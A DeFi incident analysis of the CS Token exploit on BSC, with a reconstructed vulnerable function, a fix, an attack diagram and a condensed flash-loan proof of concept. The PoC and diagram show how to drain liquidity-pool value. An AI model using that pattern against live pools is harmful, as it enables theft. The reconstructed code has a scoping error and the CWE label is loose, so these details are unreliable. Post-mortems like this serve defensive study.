# CS Token — Stale Global Variable `burnAmount` Calculation Bug Analysis

| Field | Details |
|------|------|
| **Date** | 2023-05-12 |
| **Protocol** | CS Token |
| **Chain** | BSC |
| **Loss** | Unknown |
| **Attacker** | Unknown |
| **Attack Tx** | [0x906394b2...](https://explorer.phalcon.xyz/tx/bsc/0x906394b2ee093720955a7d55bff1666f6cf6239e46bea8af99d6352b9687baa4) |
| **Vulnerable Contract** | CS Token Contract |
| **Root Cause** | Global variable `sellAmount` not updated, causing stale value to be used in `burnAmount` calculation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/CS_exp.sol) |

---
## 1. Vulnerability Overview

The CS Token `_transfer()` function uses the global variable `sellAmount` when calculating the burn amount (`burnAmount`). However, `sellAmount` is never updated to reflect the current transaction volume — it retains its previous value. This allowed an attacker to exploit the discrepancy by inducing excessive burns when the initial `sellAmount` was high, or conversely bypassing burns entirely to extract profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: uses stale sellAmount
uint256 public sellAmount;  // Global variable (update missing)

function _transfer(address sender, address recipient, uint256 amount) internal {
    if (isPair[recipient]) {  // Sell transaction
        // ❌ sellAmount reflects previous state, not the current trade amount
        uint256 burnAmount = sellAmount * burnRate / 100;
        _burn(sender, burnAmount);  // Incorrect burnAmount applied
        // sellAmount = amount; ← This update is missing
    }
    _balances[sender] -= amount;
    _balances[recipient] += amount - burnAmount;
}

// ✅ Fix
function _transfer(address sender, address recipient, uint256 amount) internal {
    if (isPair[recipient]) {
        sellAmount = amount;  // ✅ Update to current trade amount
        uint256 burnAmount = sellAmount * burnRate / 100;
        _burn(sender, burnAmount);
    }
    // ...
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Global variable `sellAmount` not updated, causing stale value to be used in `burnAmount` calculation
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ PancakeSwap Flash Loan (WBNB)
  │
  ├─2─▶ Swap large WBNB → CS (manipulate sellAmount)
  │       Sets sellAmount to a specific value
  │
  ├─3─▶ On CS → WBNB sell:
  │       burnAmount = stale sellAmount * rate / 100
  │       Burn amount differs from actual sell amount → LP imbalance
  │
  ├─4─▶ Exploit imbalance to realize additional profit
  │
  └─5─▶ Repay flash loan → net profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract CSExp is Test, IPancakeCallee {
    function testExploit() public {
        // Borrow WBNB via flash loan
        pancakePair.swap(flashWBNBAmount, 0, address(this), abi.encode("attack"));
    }

    function pancakeCall(address, uint256 amount, uint256, bytes calldata) external {
        // 1. Swap WBNB → CS to manipulate sellAmount
        swapWBNBtoCS(amount / 2);

        // 2. Swap CS → WBNB: burnAmount based on stale sellAmount → LP imbalance
        swapCStoWBNB(cs.balanceOf(address(this)));

        // 3. Claim excess WBNB resulting from imbalance
        csPair.skim(address(this));

        // 4. Repay flash loan
        IERC20(wbnb).transfer(address(pancakePair), amount + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Stale State Variable |
| **Attack Vector** | Flash Loan + Global Variable Manipulation |
| **Impact Scope** | CS Token LP |
| **DASP Classification** | Business Logic Flaw |
| **CWE** | CWE-362: Time-of-Check Time-of-Use (TOCTOU) |

## 6. Remediation Recommendations

1. **Immediate global variable update**: Always refresh state variables to their latest values within transaction functions.
2. **Prefer local variables**: Use function parameters or local variables instead of global state where possible.
3. **Unit tests**: Validate `burnAmount` calculations across diverse transaction scenarios.

## 7. Lessons Learned

- Stale global variables are dangerous when functions execute under unexpected state conditions.
- According to analyses by BlockSec and numencyber, this is a straightforward state management bug.
- The Phalcon Explorer allowed clear tracing of the attack flow.